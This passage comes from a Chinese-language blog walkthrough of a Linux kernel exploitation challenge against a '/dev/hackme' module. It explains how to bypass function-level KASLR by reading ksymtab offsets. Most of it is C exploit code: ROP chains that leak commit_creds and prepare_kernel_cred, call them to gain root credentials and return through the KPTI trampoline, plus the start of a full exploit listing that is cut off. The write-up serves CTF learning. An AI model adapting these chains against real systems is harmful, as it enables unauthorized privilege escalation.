open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    overflow();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加-KASLR"><a href="#添加-KASLR" class="headerlink" title="添加 KASLR"></a>添加 KASLR</h3><p>内核地址随机化，和用户态的 <code>ASLR</code> 一样。在用户态中，我们会通过泄露段中的地址，从而计算段的基地址，再利用偏移算出其他函数地址。对于内核态也是如此，但是值得注意的是，大多数符号都是自己随机化的，所以地址和内核基址(.text)之间的偏移量并不像之前一样是恒定的。</p><p>但是还是有洞可寻的，内核中的某些区域永远不会被随机化：</p><ul><li>从 _text base 到 __x86_retpoline_r15 的函数，即 _text+0x400dc6 不受影响。但是，commit_creds() 和 prepare_kernel_cred() 不在这个区域。</li><li>swapgs_restore_regs_and_return_to_usermode() 不受影响</li><li>从 _text+0xf85198 开始的内核符号表 ksymtab 不受影响。 这里包含可用于计算 commit_creds() 和 prepare_kernel_cred() 的地址的偏移量。</li></ul><p>来看看内核符号表 ksymtab ，value_offset 是我们该关注的，它是从 ksymtab 中符号条目的地址到实际符号地址本身的偏移量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> value_offset;</span><br><span class="line">  <span class="keyword">int</span> name_offset;</span><br><span class="line">  <span class="keyword">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以从 <code>/proc/kallsyms</code> 中获取 ksymtab 的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep ksymtab_commit_creds</span><br><span class="line">-&gt; ffffffffb7f87d90 r __ksymtab_commit_creds</span><br><span class="line">cat /proc/kallsyms | grep ksymtab_prepare_kernel_cred</span><br><span class="line">-&gt; ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><p>首先还是要泄露地址，测试发现在偏移量为 38 处有一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line">    image_base = leak[<span class="number">38</span>] - <span class="number">0xa157</span>ULL;</span><br><span class="line">    kpti_trampoline = image_base + <span class="number">0x200f10</span>UL + <span class="number">22UL</span>;</span><br><span class="line">    pop_rax_ret = image_base + <span class="number">0x4d11</span>UL;</span><br><span class="line">    read_mem_pop1_ret = image_base + <span class="number">0x4aae</span>UL;</span><br><span class="line">    pop_rdi_rbp_ret = image_base + <span class="number">0x38a0</span>UL;</span><br><span class="line">    ksymtab_prepare_kernel_cred = image_base + <span class="number">0xf8d4fc</span>UL;</span><br><span class="line">    ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>UL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; Image base: %lx\n&quot;</span>, image_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是泄露 commit_creds() 和 prepare_kernel_cred() 了</p><h4 id="泄露-commit-creds"><a href="#泄露-commit-creds" class="headerlink" title="泄露 commit_creds"></a>泄露 commit_creds</h4><p>先说说泄露 commit_creds() </p><p>获取 ksymtab_commit_creds 的 value_offset()，然后将它们相加即可</p><p>利用以下几个 gadget ，将 rax 赋成 <code>ksymtab_commit_creds - 0x10</code> ，之后 eax 就会被赋值为 <code>ksymtab_commit_creds 的内容</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_ret = image_base + <span class="number">0x4d11</span>UL; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> read_mem_pop1_ret = image_base + <span class="number">0x4aae</span>UL; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_rbp_ret = image_base + <span class="number">0x38a0</span>UL; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br></pre></td></tr></table></figure><p>因为 KPTI 保护并没有关，所以还是要跳到 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_1</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rax_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = ksymtab_commit_creds - <span class="number">0x10</span>; <span class="comment">// rax &lt;- __ksymtabs_commit_creds - 0x10</span></span><br><span class="line">    payload[off++] = read_mem_pop1_ret; <span class="comment">// rax &lt;- [__ksymtabs_commit_creds]</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_commit_creds;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to leak commit_creds()&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即使在 KPTI trampoline 中有一个 pop rax，并且我们使用一个虚拟值来弹出它，我们读取的结果 rax 仍然可以正确恢复，所以我们不需要关心它。</p><p>当返回到用户态后，我们就需要用 rax 的值来计算 commit_creds() 的实际地址，这里创建了一个 unsigned long 类型的全局变量 tmp_store ，用于存储 rax 的值。然后再将 tmp_store 和 ksymtab_commit_creds 相加，(注意要将 tmp_store  转换为 int 类型，因为 <code>value_offset</code> 的数据类型是 int )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_commit_creds</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    commit_creds = ksymtab_commit_creds + (<span class="keyword">int</span>)tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; commit_creds: %lx\n&quot;</span>, commit_creds);</span><br><span class="line">    stage_2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是泄露 prepare_kernel_cred 了。</p><h4 id="泄露-prepare-kernel-cred"><a href="#泄露-prepare-kernel-cred" class="headerlink" title="泄露 prepare_kernel_cred"></a>泄露 prepare_kernel_cred</h4><p>和泄露 commit_creds 很像，就不多说了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_2</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rax_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = ksymtab_prepare_kernel_cred - <span class="number">0x10</span>; <span class="comment">// rax &lt;- __ksymtabs_prepare_kernel_cred - 0x10</span></span><br><span class="line">    payload[off++] = read_mem_pop1_ret; <span class="comment">// rax &lt;- [__ksymtabs_prepare_kernel_cred]</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_prepare_kernel_cred;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to leak prepare_kernel_cred()&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (<span class="keyword">int</span>)tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; prepare_kernel_cred: %lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">    stage_3();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用-prepare-kernel-cred-0"><a href="#调用-prepare-kernel-cred-0" class="headerlink" title="调用 prepare_kernel_cred(0)"></a>调用 prepare_kernel_cred(0)</h4><p>然后用同样的办法调用 prepare_kernel_cred(0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_3</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_rbp_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)after_prepare_kernel_cred;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to call prepare_kernel_cred(0)&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">after_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    returned_creds_struct = tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; returned_creds_struct: %lx\n&quot;</span>, returned_creds_struct);</span><br><span class="line">    stage_4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用-commit-creds-0"><a href="#调用-commit-creds-0" class="headerlink" title="调用 commit_creds(0)"></a>调用 commit_creds(0)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_4</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_rbp_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = returned_creds_struct; <span class="comment">// rdi &lt;- returned_creds_struct</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(returned_creds_struct)</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to call commit_creds(returned_creds_struct)&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="完整exp-4"><a href="#完整exp-4" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc 1.c -static -masm=intel -g -o 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span 